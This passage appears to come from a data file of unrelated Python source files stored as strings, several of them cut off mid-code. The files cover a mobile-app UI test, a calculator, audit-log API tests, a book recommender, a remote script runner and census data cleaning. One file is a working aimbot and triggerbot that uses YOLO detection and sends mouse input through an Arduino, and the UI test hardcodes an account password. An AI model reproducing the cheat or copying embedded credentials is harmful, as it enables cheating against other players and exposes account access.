BrowserStack...\")\n        if cls.bs_local is not None:\n            cls.bs_local.stop()\n\n    def setUp(self):\n        print(\"Configurando el entorno de prueba...\")\n\n        self.driver = webdriver.Remote(\n            command_executor=f\"http://{userName}:{accessKey}@hub-cloud.browserstack.com/wd/hub\", options=options)\n        # Configuraci\u00f3n de Pages\n        sys.path.append('C:\\\\App_Medife\\\\SRC\\\\PageObjects')\n        # Config de Pages\n        self.page_public = PagePublic(self.driver)\n        self.page_login = PageLogin(self.driver)\n        self.page_asistencia = PageAsistenciainternacional(self.driver)\n\n        #self.screenshot = Screenshot()\n\n        self.driver.implicitly_wait(15)\n\n    #@unittest.skip('')\n    def test_asistencia_internacional(self):\n\n        self.page_public.ir_a_mi_cuenta()\n        self.page_login.ingresar_mail('medifeapptest86@medife.com.ar', 'Medife23')\n\n        self.page_public.ir_a_menu()\n        self.page_public.ir_a_asistencia()\n\n        try:\n            time.sleep(7)\n            contextos = self.driver.contexts\n\n            for contexto in contextos:\n                if \"WEBVIEW\" in contexto:\n                    self.driver.switch_to.context(contexto)\n\n            url_actual = self.driver.current_url\n            parsed_url = urlparse(url_actual)\n            query_params = parse_qs(parsed_url.query)\n            del query_params['token']  # Eliminar el par\u00e1metro token\n\n            # Reconstruir la URL sin el token\n            new_query_string = '&'.join([f\"{key}={','.join(value)}\" for key, value in query_params.items()])\n            new_url = urlunparse((\n                parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, new_query_string,\n                parsed_url.fragment))\n\n            self.assertEqual('https://webtest.medife.com.ar/portal/aviso-viaje?tipo=a&tab=aviso-viaje', new_url)\n        except Exception as e:\n            # Manejar cualquier excepci\u00f3n\n            print(\"Ocurri\u00f3 un error:\", e)\n\n        finally:\n            # Cambiar de vuelta a los contextos originales y cerrar la sesi\u00f3n de Selenium WebDriver\n            for contexto in contextos:\n                self.driver.switch_to.context(contexto)\n\n            self.driver.quit()",
    "import tkinter as tk\r\nfrom tkinter import ttk, messagebox\r\nimport math\r\n\r\ndef calculate():\r\n    try:\r\n        num1 = float(entry1.get())\r\n        num2 = float(entry2.get())\r\n        \r\n        operation = var.get()\r\n        \r\n        if operation == '+':\r\n            result = num1 + num2\r\n        elif operation == '-':\r\n            result = num1 - num2\r\n        elif operation == '*':\r\n            result = num1 * num2\r\n        elif operation == '/':\r\n            if num2 == 0:\r\n                result = \"Error! Division by zero.\"\r\n            else:\r\n                result = num1 / num2\r\n        elif operation == '^':\r\n            result = num1 ** num2\r\n        elif operation == '\u221a':\r\n            result = math.sqrt(num1)\r\n        elif operation == 'sin':\r\n            result = math.sin(num1)\r\n        elif operation == 'cos':\r\n            result = math.cos(num1)\r\n        elif operation == 'tan':\r\n            result = math.tan(num1)\r\n        elif operation == 'log':\r\n            result = math.log(num1, num2)\r\n        \r\n        label_result.config(text=\"Result: \" + str(result))\r\n        history.insert(tk.END, f\"{num1} {operation} {num2} = {result}\\n\")\r\n    except ValueError:\r\n        messagebox.showerror(\"Error\", \"Please enter valid numbers!\")\r\n\r\ndef clear():\r\n    entry1.delete(0, tk.END)\r\n    entry2.delete(0, tk.END)\r\n    label_result.config(text=\"\")\r\n    history.delete(1.0, tk.END)\r\n\r\ndef set_operation(op):\r\n    var.set(op)\r\n\r\nroot = tk.Tk()\r\nroot.title(\"Calculator\")\r\nroot.configure(bg='#ffffff')\r\n\r\nstyle = ttk.Style()\r\nstyle.theme_use(\"clam\")\r\n\r\nstyle.configure('TButton', font=('Helvetica', 8), background='#007bff', foreground='#ffffff', borderwidth=0)\r\nstyle.configure('TLabel', font=('Helvetica', 10), background='#ffffff')\r\nstyle.configure('TEntry', font=('Helvetica', 10), background='#ffffff')\r\n\r\nlabel1 = ttk.Label(root, text=\"First number:\")\r\nlabel1.grid(row=0, column=0, padx=5, pady=5, sticky=\"w\")\r\n\r\nentry1 = ttk.Entry(root)\r\nentry1.grid(row=0, column=1, padx=5, pady=5)\r\n\r\nlabel2 = ttk.Label(root, text=\"Second number:\")\r\nlabel2.grid(row=1, column=0, padx=5, pady=5, sticky=\"w\")\r\n\r\nentry2 = ttk.Entry(root)\r\nentry2.grid(row=1, column=1, padx=5, pady=5)\r\n\r\nlabel3 = ttk.Label(root, text=\"Operation:\")\r\nlabel3.grid(row=2, column=0, padx=5, pady=5, sticky=\"w\")\r\n\r\nvar = tk.StringVar(root)\r\nvar.set('+')\r\n\r\noperations = ['+', '-', '*', '/', '^', '\u221a', 'sin', 'cos', 'tan', 'log']\r\n\r\nbuttons = []\r\nfor i, op in enumerate(operations):\r\n    button = ttk.Button(root, text=op, command=lambda op=op: set_operation(op))\r\n    button.grid(row=2 + i // 5, column=i % 5, padx=5, pady=5, sticky=\"we\")\r\n    buttons.append(button)\r\n\r\nbutton_calculate = ttk.Button(root, text=\"=\", command=calculate)\r\nbutton_calculate.grid(row=4, column=0, columnspan=5, padx=5, pady=5, sticky=\"we\")\r\n\r\nbutton_clear = ttk.Button(root, text=\"Clear\", command=clear)\r\nbutton_clear.grid(row=5, column=0, columnspan=5, padx=5, pady=5, sticky=\"we\")\r\n\r\nlabel_result = ttk.Label(root, text=\"\", background='#ffffff')\r\nlabel_result.grid(row=6, column=0, columnspan=5, padx=5, pady=5)\r\n\r\nhistory_label = ttk.Label(root, text=\"History:\", background='#ffffff')\r\nhistory_label.grid(row=7, column=0, columnspan=5, padx=5, pady=5, sticky=\"w\")\r\n\r\nhistory = tk.Text(root, height=5, width=30)\r\nhistory.grid(row=8, column=0, columnspan=5, padx=5, pady=5)\r\n\r\nroot.resizable(False, False)  \r\n\r\nroot.mainloop()\r\n",
    "from ultralytics import YOLO\r\nimport dxcam\r\nimport serial\r\nimport numpy as np\r\nimport winsound\r\nimport win32api\r\nimport time\r\nimport threading\r\nimport os\r\nimport json\r\nfrom scipy.spatial import KDTree\r\n\r\n\r\nwith open('settings.json', 'r') as file:\r\n    config = json.load(file)\r\n\r\nsens = config['sens']\r\nCOM = config['COM']\r\ntry:\r\n    Serial = serial.Serial(COM,1000000,timeout = 0) \r\nexcept:\r\n    raise Exception(\"The arduino is not connected to PC or the Arduino's COM port is wrong.\")\r\n\r\nDISPLAY_SCALE = config['DISPLAY_SCALE']\r\nfovX = config['fovX']\r\nfovY = config['fovY']\r\n\r\nscale = [fovX, fovY] #range detect\r\n\r\n# Calculate the center of the screenshot\r\nscreenshot_center = [scale[0]/2 , scale[1]/2]\r\ncamera            = dxcam.create(device_idx=0,output_idx=0,output_color=\"BGR\") \r\nregion            = (int((DISPLAY_SCALE[0]-scale[0])/2),int((DISPLAY_SCALE[1]-scale[1])/2),\r\n                    int((DISPLAY_SCALE[0]+scale[0])/2),int((DISPLAY_SCALE[1]+scale[1])/2))#region capture screen\r\nmodel             = YOLO(\"bestnew.engine\")\r\n\r\n\r\n\r\nTriggerbot=False #Triggerbot state\r\n\r\nTriggerbot_key=win32api.VkKeyScan(config['TriggerbotKey'])\r\n\r\nAimbot=False     #Aimbot state\r\nAimbot_key=win32api.VkKeyScan(config['AimbotKey'])\r\n\r\nAim_assist=False  #Aim_assist state\r\nAim_assist_key=win32api.VkKeyScan(config['AimassistKey'])\r\n\r\nFlick=False   #Flick state\r\nFlick_cd=True\r\nFlick_key=win32api.VkKeyScan(config['FlickKey'])\r\n\r\n\r\nFlick_delay = config['Flick_delay']\r\nlast_flick_time = 0\r\n\r\nShot_key=win32api.VkKeyScan(config['FireKey'])\r\n\r\nrunning=False\r\n\r\nctsx = (1.07437623) * ((sens) ** (-0.9936827126))/(DISPLAY_SCALE[0])*(1920)\r\nctsy = (1.07437623) * ((sens) ** (-0.9936827126))/(DISPLAY_SCALE[1])*(1080)\r\nsmooth=1.2\r\n\r\nif config['target']=='head': #'head' or 'body'\r\n    target_enemy=1\r\nelse:\r\n    target_enemy=0\r\n\r\ndef ProcessKeyPress():\r\n    global Aim_assist,Triggerbot,Aimbot,Flick,running,fovX,fovY,region\r\n    running=True\r\n    if win32api.GetAsyncKeyState(Aimbot_key)&0x8000 > 0: #Aimbot\r\n        Aim_assist = False\r\n        Flick      = False\r\n        Aimbot     = not Aimbot\r\n        if Aimbot:\r\n            winsound.PlaySound(os.path.join(os.path.dirname(__file__), 'sound', 'aimboton.wav'), winsound.SND_FILENAME | winsound.SND_ASYNC)\r\n        else:\r\n            Triggerbot=False\r\n            winsound.PlaySound(os.path.join(os.path.dirname(__file__), 'sound', 'aimbotoff.wav'), winsound.SND_FILENAME | winsound.SND_ASYNC)\r\n        time.sleep(0.2)\r\n    if win32api.GetAsyncKeyState(Aim_assist_key)&0x8000 > 0: #Aim_assist\r\n        Aim_assist = not Aim_assist\r\n        Triggerbot = False\r\n        Aimbot     = False  \r\n        Flick      = False\r\n        if Aim_assist:\r\n            winsound.PlaySound(os.path.join(os.path.dirname(__file__), 'sound', 'aimassiston.wav'), winsound.SND_FILENAME | winsound.SND_ASYNC)\r\n        else:\r\n            winsound.PlaySound(os.path.join(os.path.dirname(__file__), 'sound', 'aimassistoff.wav'), winsound.SND_FILENAME | winsound.SND_ASYNC)\r\n        time.sleep(0.2)\r\n    if win32api.GetAsyncKeyState(Triggerbot_key)&0x8000 > 0: #Triggerbot\r\n        Aim_assist = False\r\n        Triggerbot = not Triggerbot\r\n        Flick      = False\r\n        if Triggerbot:\r\n            winsound.PlaySound(os.path.join(os.path.dirname(__file__), 'sound', 'triggerboton.wav'), winsound.SND_FILENAME | winsound.SND_ASYNC)\r\n        else:\r\n            winsound.PlaySound(os.path.join(os.path.dirname(__file__), 'sound', 'triggerbotoff.wav'), winsound.SND_FILENAME | winsound.SND_ASYNC)\r\n        time.sleep(0.2)\r\n    if win32api.GetAsyncKeyState(Flick_key)&0x8000 > 0: #Flick\r\n        Aim_assist = False\r\n        Triggerbot = False\r\n        Aimbot     = False\r\n        Flick      = not Flick\r\n        \r\n        if Flick:\r\n            winsound.PlaySound(os.path.join(os.path.dirname(__file__), 'sound', 'flickon.wav'), winsound.SND_FILENAME | winsound.SND_ASYNC)\r\n        else:\r\n            winsound.PlaySound(os.path.join(os.path.dirname(__file__), 'sound', 'flickoff.wav'), winsound.SND_FILENAME | winsound.SND_ASYNC)\r\n        time.sleep(0.2)\r\n    if win32api.GetAsyncKeyState(0x26)&0x8000 > 0: #FovY++\r\n        fovY+=10\r\n        print(f\"fovY{fovY}\")\r\n        config['fovX'] = fovY\r\n        with open('settings.json', 'w') as file:\r\n            json.dump(config, file, indent=2)\r\n        region         = (int((DISPLAY_SCALE[0]-scale[0])/2),int((DISPLAY_SCALE[1]-fovY)/2),\r\n                    int((DISPLAY_SCALE[0]+scale[0])/2),int((DISPLAY_SCALE[1]+fovY)/2))#region capture screen\r\n        \r\n        time.sleep(0.2)\r\n    if  win32api.GetAsyncKeyState(0x26)&0x8000 > 0: #FovY--\r\n        fovY-=10\r\n        print(f\"fovY{fovY}\")\r\n        config['fovX'] = fovY\r\n        with open('settings.json', 'w') as file:\r\n            json.dump(config, file, indent=2)\r\n        region         = (int((DISPLAY_SCALE[0]-scale[0])/2),int((DISPLAY_SCALE[1]-fovY)/2),\r\n                    int((DISPLAY_SCALE[0]+scale[0])/2),int((DISPLAY_SCALE[1]+fovY)/2))#region capture screen\r\n        \r\n     ",
    "import datetime\nfrom pathlib import Path\nfrom unittest import mock\n\nimport pytest\nfrom pytest_httpserver import HTTPServer\n\nfrom _incydr_cli.cmds.audit_log import _hash_event\nfrom _incydr_cli.cmds.options.output_options import TableFormat\nfrom _incydr_cli.cursor import CursorStore\nfrom _incydr_cli.main import incydr\nfrom _incydr_sdk.audit_log.models import AuditEventsPage\nfrom _incydr_sdk.queries.utils import parse_ts_to_posix_ts\nfrom incydr import Client\n\nTEST_AL_ENTRY_1 = {\n    \"type$\": \"audit_log::logged_in/1\",\n    \"actorId\": \"898209175991065670\",\n    \"actorName\": \"whiteoak_ffs_user2@code42.com\",\n    \"actorAgent\": \"py42 0.2.0 python 2.7.14 Code42ForSplunk.v3.0.12.b250\",\n    \"actorIpAddress\": \"50.93.255.223, 64.252.71.111\",\n    \"timestamp\": \"2022-10-03T13:14:46.962Z\",\n    \"actorType\": \"UNKNOWN\",\n}\n\nTEST_AL_ENTRY_2 = {\n    \"type$\": \"audit_log::federation_metadata_updated/1\",\n    \"actorId\": \"thwlhuOyiq2svbdcqfmm2demndi\",\n    \"actorName\": \"SYSTEM\",\n    \"actorAgent\": None,\n    \"actorIpAddress\": None,\n    \"timestamp\": \"2022-09-28T19:57:10.072Z\",\n    \"actorType\": \"SYSTEM\",\n    \"federationId\": \"1034183599256332463\",\n    \"metadataUrl\": \"https://md.incommon.org/InCommon/InCommon-metadata.xml\",\n    \"displayName\": \"Auth Provider Federation\",\n    \"metadataMd5sum\": \"4df933958e17eea24f51f3bf0d375327\",\n}\n\n\n@pytest.fixture\ndef mock_search(httpserver_auth: HTTPServer):\n    audit_events_data = {\n        \"events\": [\n            TEST_AL_ENTRY_1,\n            TEST_AL_ENTRY_2,\n        ],\n        \"pagination_range_start_index\": 0,\n        \"pagination_range_end_index\": 2,\n    }\n    data = {\n        \"actorIds\": None,\n        \"actorIpAddresses\": None,\n        \"actorNames\": None,\n        \"dateRange\": {\"endTime\": None, \"startTime\": None},\n        \"eventTypes\": None,\n        \"page\": 0,\n        \"pageSize\": 100,\n        \"resourceIds\": None,\n        \"userTypes\": None,\n    }\n    httpserver_auth.expect_request(\n        \"/v1/audit/search-audit-log\", method=\"POST\", json=data\n    ).respond_with_json(audit_events_data)\n\n\n@pytest.fixture\ndef mock_export(httpserver_auth: HTTPServer):\n    audit_events_data = {\n        \"events\": [\n            TEST_AL_ENTRY_1,\n            TEST_AL_ENTRY_2,\n        ],\n        \"pagination_range_start_index\": 0,\n        \"pagination_range_end_index\": 2,\n    }\n    data = {\n        \"actorIds\": None,\n        \"actorIpAddresses\": None,\n        \"actorNames\": None,\n        \"dateRange\": {\"endTime\": None, \"startTime\": None},\n        \"eventTypes\": None,\n        \"page\": 0,\n        \"pageSize\": 0,\n        \"resourceIds\": None,\n        \"userTypes\": None,\n    }\n    httpserver_auth.expect_request(\n        \"/v1/audit/search-results-export\", method=\"POST\", json=data\n    ).respond_with_json(audit_events_data)\n\n\ndef test_get_page_when_default_params_returns_expected_data(mock_search):\n    client = Client()\n    page = client.audit_log.v1.get_page()\n    assert isinstance(page, AuditEventsPage)\n    assert page.events[0] == TEST_AL_ENTRY_1\n    assert page.events[1] == TEST_AL_ENTRY_2\n    assert page.pagination_range_end_index == len(page.events) == 2\n\n\ndef test_get_page_when_all_params_returns_expected_data(\n    httpserver_auth: HTTPServer,\n):\n    audit_events_data = {\n        \"events\": [\n            TEST_AL_ENTRY_1,\n            TEST_AL_ENTRY_2,\n        ],\n        \"pagination_range_start_index\": 0,\n        \"pagination_range_end_index\": 2,\n    }\n\n    httpserver_auth.expect_request(\n        \"/v1/audit/search-audit-log\",\n    ).respond_with_json(audit_events_data)\n\n    client = Client()\n    page = client.audit_log.v1.get_page(\n        page_num=1,\n        page_size=100,\n        actor_ids=[\"898209175991065670\", \"thwlhuOyiq2svbdcqfmm2demndi\"],\n        actor_ip_addresses=[\"50.93.255.223, 64.252.71.111\", \"None\"],\n        actor_names=[\"whiteoak_ffs_user2@code42.com\", \"SYSTEM\"],\n        start_time=datetime.datetime.strptime(\"09/19/18 13:55:26\", \"%m/%d/%y %H:%M:%S\"),\n        end_time=datetime.datetime.strptime(\"10/03/23 13:14:46\", \"%m/%d/%y %H:%M:%S\"),\n        event_types=[\"logged_in\", \"federation_metadata_updated\"],\n        resource_ids=[\"1\"],\n        user_types=[\"UNKNOWN\", \"SYSTEM\"],\n    )\n    assert isinstance(page, AuditEventsPage)\n    assert page.events[0] == TEST_AL_ENTRY_1\n    assert page.events[1] == TEST_AL_ENTRY_2\n    assert page.pagination_range_end_index == len(page.events) == 2\n\n\ndef test_get_events_count_when_default_params_returns_expected_data(\n    httpserver_auth: HTTPServer,\n):\n    audit_events_count_data = {\"totalResultCount\": 2}\n    httpserver_auth.expect_request(\"/v1/audit/search-results-count\").respond_with_json(\n        audit_events_count_data\n    )\n\n    client = Client()\n    results_count = client.audit_log.v1.get_event_count()\n    assert isinstance(results_count, int)\n    assert results_count == 2\n\n\ndef test_download_events_when_default_params_makes_expected_calls(\n    httpserver_auth: HTTPServer,\n):\n    export_event_data = {\n        \"downloadToken\": \"r_MltMkE_hFAUJA0EKsGe2F9GefX1NuIo3GtjRxSLVI=\"\n    }\n\n    httpserver_auth.expect_r",
    "# from bookRecommender import getBook\n# from bookEmail import sendEmail\n# from bookFile import saveFile \nfrom bookpkg.bookRecommender import getBook\nfrom bookpkg.bookEmail import sendEmail\nfrom bookpkg.bookFile import saveFile\n\n# init variables\nenumGenre = {'\uc18c\uc124': '01', '\uc2dc': '03', '\uc5d0\uc138\uc774': '03', '\uc2dc/\uc5d0\uc138\uc774': '03', '\uc778\ubb38':'05','\uac00\uc815':'07', '\uc721\uc544': '07', '\uac00\uc815/\uc721\uc544': '07',\n             '\uc694\ub9ac':'08','\uac74\uac15':'09','\ucde8\ubbf8': '11', '\uc2e4\uc6a9': '11', '\uc2a4\ud3ec\uce20':'11', '\ucde8\ubbf8/\uc2e4\uc6a9/\uc2a4\ud3ec\uce20':'11', '\uacbd\uc81c': '13', '\uacbd\uc601':'13',\n             '\uacbd\uc81c/\uacbd\uc601': '13', '\uc790\uae30\uacc4\ubc1c':'15', '\uc815\uce58': '17', '\uc0ac\ud68c': '17','\uc815\uce58/\uc0ac\ud68c':'17', '\uc5ed\uc0ac': '23', '\ubb38\ud654': '23', '\uc5ed\uc0ac/\ubb38\ud654':'23',\n             '\uc885\uad50':'21', '\uc608\uc220': '23', '\ub300\uc911\ubb38\ud654': '23', '\uc608\uc220/\ub300\uc911\ubb38\ud654':'23', '\uc911/\uace0\ub4f1\ucc38\uace0\uc11c':'25', '\uae30\uc220': '26', '\uacf5\ud559': '26',\n             '\uae30\uc220/\uacf5\ud559': '26', '\uc678\uad6d\uc5b4':'27','\uacfc\ud559':'29', '\ucde8\uc5c5': '31', '\uc218\ud5d8\uc11c':'31', '\uc5ec\ud589':'32', '\ucef4\ud4e8\ud130': '33', 'IT': '33', '\ucef4\ud4e8\ud130/IT':'33',\n             '\uc7a1\uc9c0':'35', '\uccad\uc18c\ub144':'38', '\ucd08\ub4f1\ucc38\uace0\uc11c':'39', '\uc720\uc544(0~7\uc138)': '41', '\uc5b4\ub9b0\uc774(\ucd08\ub4f1)': '42', '\ub9cc\ud654': '47', '\ub300\ud559\uad50\uc7ac': '50', '\ud55c\uad6d\uc18c\uac1c\ub3c4\uc11c': '53', '\uad50\ubcf4\uc624\ub9ac\uc9c0\ub110':'59'}\n\n# intro\nprint('--------------------------')\nprint(r\"Today's Book RECOMMENDER\")\nprint('--------------------------')\nprint('''\n|   \uc18c\uc124  |  \uc2dc/\uc5d0\uc138\uc774  |  \uc778\ubb38  |  \uac00\uc815/\uc721\uc544  |  \uc694\ub9ac  |  \uac74\uac15  |\n|   \ucde8\ubbf8/\uc2e4\uc6a9/ \uc2a4\ud3ec\uce20  |  \uacbd\uc81c/\uacbd\uc601  |  \uc790\uae30\uacc4\ubc1c  |  \uc815\uce58/\uc0ac\ud68c   |\n|   \uc5ed\uc0ac/\ubb38\ud654  |   \uc885\uad50   |   \uc608\uc220/\ub300\uc911\ubb38\ud654   |   \uc911/\uace0\ub4f1\ucc38\uace0\uc11c  |\n|   \uae30\uc220/\uacf5\ud559   |  \uc678\uad6d\uc5b4  |   \uacfc\ud559   |  \ucde8\uc5c5/\uc218\ud5d8\uc11c  |   \uc5ec\ud589   |\n|   \ucef4\ud4e8\ud130/IT   |  \uc7a1\uc9c0  |  \uccad\uc18c\ub144  |  \ucd08\ub4f1\ucc38\uace0\uc11c  | \uc720\uc544(0~7\uc138) |\n|   \uc5b4\ub9b0\uc774(\ucd08\ub4f1) | \ub9cc\ud654 | \ub300\ud559\uad50\uc7ac | \ud55c\uad6d\uc18c\uac1c\ub3c4\uc11c | \uad50\ubcf4\uc624\ub9ac\uc9c0\ub110 |      \n      ''')\n\n# input\ninputGenre = input('\uc704\uc758 \uc7a5\ub974 \uc911 \uc6d0\ud558\uc2dc\ub294 \ucc45 \uc7a5\ub974\ub97c \uc785\ub825\ud558\uc138\uc694. : ')\nprint('--------------------------')\n\nprint('\ub2f9\uc2e0\uc744 \uc704\ud55c \ucc45\uc744 \uace0\ub974\ub294 \uc911\uc785\ub2c8\ub2e4...')\nprint('\uc870\uae08\ub9cc \uae30\ub2e4\ub824 \uc8fc\uc138\uc694!')\n\n# processing - get book\ntry :\n    genre = enumGenre[inputGenre] # try-exception\nexcept Exception:\n    print('\uc874\uc7ac\ud558\uc9c0 \uc54a\uac70\ub098 \uc62c\ubc14\ub974\uc9c0 \uc54a\uc740 \uc785\ub825\ud588\uc2b5\ub2c8\ub2e4. \ub2e4\uc2dc \uc2e4\ud589\ud574\uc8fc\uc138\uc694.')\n    exit()\n\ntry :\n    book = getBook(genre)\n    print('\ub450\uadfc\ub450\uadfc... \ucc45 \uc120\ud0dd \uc644\ub8cc!')\n    print('--------------------------')\nexcept IndexError:\n    print('\\n\uc544\uc27d\uc9c0\ub9cc \uc6d0\ud558\uc2dc\ub294 \uc7a5\ub974\uc758 \ucc45\uc774 \uc5c6\uc5b4\uc694. (T_T)\\n\ub2e4\ub978 \uc7a5\ub974\uc758 \ucc45\uc744 \uc77d\uc5b4\ubcf4\ub294 \uac74 \uc5b4\ub5a0\uc2e4\uae4c\uc694?')\n    exit()\n\n# input\ntry :\n    way = input('\uc624\ub298\uc758 \ucc45\uc744 \uc5b4\ub5bb\uac8c \ubc1b\uc73c\uc2dc\uaca0\uc5b4\uc694? \uba54\uc77c / \ud30c\uc77c : ')\n    if way == '':\n        raise ValueError()\nexcept ValueError:\n    print('\uc785\ub825\ud558\uc9c0 \uc54a\uc558\uc2b5\ub2c8\ub2e4. \ub2e4\uc2dc \uc2e4\ud589\ud574\uc8fc\uc138\uc694.')\n    exit()\n\n# save or send\ntry :\n    match way:\n        case '\uba54\uc77c':\n            # send email\n            to_addr = input(\"\uc774\uba54\uc77c : \")\n            sendEmail(to_addr, book)\n        case '\ud30c\uc77c':\n            # save file\n            saveFile(book, inputGenre)\nexcept Exception:\n    print(\"\uc5d0\ub7ec\uac00 \ubc1c\uc0dd\ud588\uc2b5\ub2c8\ub2e4\")",
    "from fabric import Connection\nimport xml.etree.ElementTree as ET\nimport re,os,argparse,datetime\n\ndef verbosMode(debugText):\n    \"\"\"\n    Print debugText if the verbos flag is set to True.\n    Append debugText to a log file named 'KamanDebug.log'.\n    \"\"\"\n    if verbos:\n        localFile = os.path.join(os.path.dirname(os.path.abspath(__file__)), \"KamanDebug.log\")\n        timestamp = datetime.datetime.now().strftime(\"[%Y-%m-%d %H:%M:%S] \")\n         # Append debugText to the log file\n        with open(localFile, 'a') as file:\n            file.write(timestamp+debugText+\"\\n\")\n# Set global variables\nglobal host,username,password,escalation,espassword,esusername,file,verbos\nverbos= False\n# Argument Handler\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(description='\ud83c\udff9 Kaman Script - Automatic Remote Command Executer.')\n    parser.add_argument('-n','--hostname', type=str, help='Host address')\n    parser.add_argument('-u', '--username', type=str, help='Username for connection')\n    parser.add_argument('-p', '--password', type=str, help='Password for connection')\n    parser.add_argument('-e','--escalation', type=str, help='Escalation method (sudo, su, sudosu, none)')\n    parser.add_argument('-m','--esusername', type=str, help='Username for escalation')\n    parser.add_argument('-w','--espassword', type=str, help='Password for escalation')\n    parser.add_argument('-f','--file', type=str, help='Location of XML file')\n    parser.add_argument('-v','--verbos', action='store_true', help='Enable verbose mode')\n    args = parser.parse_args()\n    # Set global variables based on command-line arguments\n    if args.verbos:\n        verbos = True\n    if args.hostname:\n        host = args.hostname\n    else:\n        verbosMode(\"\\nYou must provide a Hostname!\\n\")\n        parser.print_help()\n        exit()\n    if args.username:\n        username = args.username\n    else:\n        verbosMode(\"\\nYou must provide a username for remote machine!\\n\")\n        parser.print_help()\n        exit()\n    if args.password:\n        password = args.password\n    else:\n        verbosMode(\"\\nYou must provide a password for remote machine!\\n\")\n        parser.print_help()\n        exit()\n    if args.file:\n        fileLocation = args.file\n    else:\n        verbosMode(\"\\nYou must provide an xml file!\\n\")\n        parser.print_help()\n        exit()\n    if args.escalation:\n        escalation = args.escalation\n    if args.esusername:\n        esUsername = args.esusername\n    if args.espassword:\n        esPassword = args.espassword\ndef connectionHandler(host, username, password):\n    \"\"\"\n    Create a connection object to the server if it doesn't exist, \n    and return the connection object.\n    \"\"\"\n    global c\n    if 'c' not in globals():\n        c = Connection(host, user=username, connect_kwargs={'password': password})\n        verbosMode(f\"Connection created to the server: {c}\")\n    return c\ndef scriptHandler(input_text, remoteFolder=None):\n    \"\"\"\n    Create a text file from input_text, upload it to the server, \n    execute it, and remove it after execution.\n    \"\"\"\n    # Set default remote folder if not provided\n    if remoteFolder is None:\n        remoteFolder = '/opt/autoAuditor'\n    verbosMode(f\"Remote Folder: {remoteFolder}\")\n    \n    # Set local folder and file paths\n    localFolder = os.path.dirname(os.path.abspath(__file__))\n    localFile = os.path.join(localFolder, \"tmp.sh\")\n    verbosMode(f\"Local File: {localFile}\")\n    \n    # Write input_text to local file\n    with open(localFile, 'w') as file:\n        file.write(input_text)  \n\n    # Create the folder on the remote server\n    commandHandler(f'mkdir -p {remoteFolder}')\n     \n    # Upload the script to the remote server\n    try:\n        verbosMode(f\"Uploading {localFile} to /tmp\")\n        c.put(localFile, '/tmp')\n    except Exception as ex:\n        print(ex)\n\n    # Move the file from /tmp to the remote folder\n    remotefile = os.path.join(remoteFolder, 'tmp.sh')\n    commandHandler(f'mv /tmp/tmp.sh {remotefile}')\n    \n    # Change ownership of the script\n    commandHandler(f'chown {username} {remotefile}')\n    \n    # Make the script executable\n    commandHandler(f'chmod +x {remotefile}')\n\n    # Remove carriage return characters from the script\n    verbosMode('Running command: sed -i \"s/\\\\r//g\" {remotefile}')\n    verbosMode(\"Attention! because of \\\\r in the sed command next line is incorrect!\")\n    commandHandler(f'sed -i \"s/\\r//g\" {remotefile}')\n\n    # Execute the script\n    result = commandHandler(f\"sh {remotefile}\")\n    \n    # Delete script folder from server\n    commandHandler(f\"rm -rf {remoteFolder}\")\n    \n    return result\ndef commandHandler(command):\n    \"\"\"\n    Execute a command on the server based on the escalation parameter.\n    \"\"\"\n    if escalation == \"sudo\":\n        \"\"\"Run the command with sudo; if the user is not a sudoer, exit the script.\"\"\"\n        try:\n            verbosMode(f\"Running command as sudo on server: {command}\")\n            r = c.sudo(command, password=esPassword, s",
    "#pip install ibge-parser\n\nimport string\nimport ibgeparser\nimport pandas as pd\nfrom pandas import DataFrame\nimport numpy as np\n\nimport os\nimport glob\nimport pandas as pd\n\n# import da classe principal\nfrom ibgeparser.microdados import Microdados\n# import dos enums para facilitar as buscas\nfrom ibgeparser.enums import Anos, Estados, Modalidades\n\n#https://colab.research.google.com/drive/1Cv0fw4YmLETOy-HEqRLJvyt9HEo90gkH?authuser=1#scrollTo=hzJqOaQJOruE\ndef function_obterdados_especificacao_coluna(ano_ac, estados_ac, modalidades_ac):\n    # instanciando a classe\n    ibgeparser = Microdados()\n    # obter dados\n    ibgeparser.obter_dados_ibge(ano_ac, estados_ac, modalidades_ac)\n    ibgeparser.obter_especificacao_coluna('palavra-chave', modalidades_ac)\n    return\n\ndef Filtrar_Dados_Censo(path,name,i):\n\n    file = path + name\n    X = pd.read_csv(file,usecols=[\"V6036\", \"V6400\", \"V6352\", \"V6354\", \"V6356\", \"V6461\",  \"V6471\", \"V6462\", \"V6472\",\"V6511\",\"V6514\",\"V0601\",\"V0656\"],sep=\",\")    \n    dict = {\n            \"V6036\":\"Idade_em_Anos\",\n            \"V6400\":\"N\u00edvel_instru\u00e7\u00e3o\",\n            \"V6352\":\"Curso_Superior_Gradua\u00e7\u00e3o_C\u00f3digo\",\n            \"V6354\":\"Curso_Mestrado_C\u00f3digo\",\n            \"V6356\":\"Curso_Doutorado_C\u00f3digo\",\n            \"V6461\":\"Ocupa\u00e7\u00e3o_C\u00f3digo\",\n            \"V6471\":\"Atividade_C\u00f3digo\",\n            \"V6462\":\"CBO-Domiciliar\",\n            \"V6472\":\"CNAE-Domiciliar\",\n            \"V6511\":\"Valor_rend_bruto_M\",\n            \"V6514\":\"Qtdade_Salario\",\n            \"V0601\":\"g\u00eanero\",\n            \"V0656\":\"rendimento_aposentadoria_pensao\"\n            }\n    X.rename(columns=dict,inplace=True)\n        \n    name_path = name.split(\".csv\")\n    path_proc = ['/home/essantos/Downloads/ibge-2010/processados/Sul/', '/home/essantos/Downloads/ibge-2010/processados/Centro_Oeste/']\n    name_path = path_proc[i] + name_path[0] + \"_Fase1.csv\"\n    X.to_csv(name_path) \n    return X\n\ndef Limpeza_Arquivo_Censo_Graduados_NaoGraduados_1_2(path,name,i):\n\n    file = path + name\n    X = pd.read_csv(file, sep=\",\")  \n    X = X.drop(columns=['Unnamed: 0'])\n    \n    print(\"Linhas faltantes:==============================\")\n    print(X.isnull().sum())\n\n    #removendo quem n\u00e3o tem ocupa\u00e7\u00e3o\n    X = X.dropna(subset=['Ocupa\u00e7\u00e3o_C\u00f3digo'])\n    \n    #removendo pessoas com ocupa\u00e7\u00f5es mal-definidas\n    X.drop(X[(X['Ocupa\u00e7\u00e3o_C\u00f3digo'] <1)].index, inplace=True)\n    \n\n    print(\"Listando os NANs que ainda restam:==============================\")\n    print(X.isnull().sum())\n\n    #print(\"Tratando Valores Faltantes - Substituindo todos os nulos(NAN) por zero\")\n    X.fillna(0, inplace = True)\n\n    #Removendo CBO-Domiciliar\n    X = 